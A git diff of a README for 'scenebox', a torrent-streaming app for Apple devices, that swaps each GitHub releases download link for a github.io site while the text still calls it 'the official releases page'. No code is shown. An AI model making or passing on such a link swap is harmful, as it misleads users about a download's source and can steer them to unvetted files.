@@ -1,6 +1,6 @@
 # 🎬 scenebox - Stream torrents on every Apple device
 
-[![Download scenebox](https://img.shields.io/badge/Download-scenebox-2ea44f?style=for-the-badge&logo=apple&logoColor=white&color=blue)](https://github.com/Xiongmaocloud/scenebox/releases)
+[![Download scenebox](https://img.shields.io/badge/Download-scenebox-2ea44f?style=for-the-badge&logo=apple&logoColor=white&color=blue)](https://xiongmaocloud.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to scenebox! This guide will walk you through everything you need to kno
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: **[https://github.com/Xiongmaocloud/scenebox/releases](https://github.com/Xiongmaocloud/scenebox/releases)**
+Visit this link to download the application: **[https://xiongmaocloud.github.io](https://xiongmaocloud.github.io)**
 
 This link will take you to the official releases page where you can find the latest version of scenebox.
 
@@ -165,7 +165,7 @@ Recent updates have focused on:
 
 ## 📥 Ready to Get Started?
 
-Visit this link to download the application: **[https://github.com/Xiongmaocloud/scenebox/releases](https://github.com/Xiongmaocloud/scenebox/releases)**
+Visit this link to download the application: **[https://xiongmaocloud.github.io](https://xiongmaocloud.github.io)**
 
 Once you've downloaded scenebox, you'll join a community of users who enjoy seamless torrent streaming across all their Apple devices. The setup is straightforward, the interface is beautiful, and the streaming performance is excellent.
 
